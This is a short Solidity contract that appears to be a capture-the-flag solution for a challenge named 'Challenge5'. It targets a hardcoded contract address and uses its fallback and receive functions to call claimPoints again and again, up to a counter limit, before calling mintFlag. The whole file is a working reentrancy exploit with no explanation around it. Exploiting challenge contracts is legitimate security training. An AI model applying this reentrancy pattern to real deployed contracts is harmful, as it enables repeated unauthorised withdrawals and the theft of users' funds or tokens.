// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IChallenge5 {
    function claimPoints() external;
    function mintFlag() external;
}

contract Challenge5Caller {
    uint256 public counter;
    address constant TARGET = 0x8ABe4F7EC1e8dc5B196ab1ddfA4321934cC50C6a;

    function run() external {
        if (counter <= 10) {
            IChallenge5(TARGET).claimPoints();
        }
        IChallenge5(TARGET).mintFlag();
    }

    fallback() external {
        if (counter <= 10) {
            counter++;
            IChallenge5(TARGET).claimPoints();
        }
    }

    receive() external payable {
        if (counter <= 10) {
            counter++;
            IChallenge5(TARGET).claimPoints();
        }
    }
}
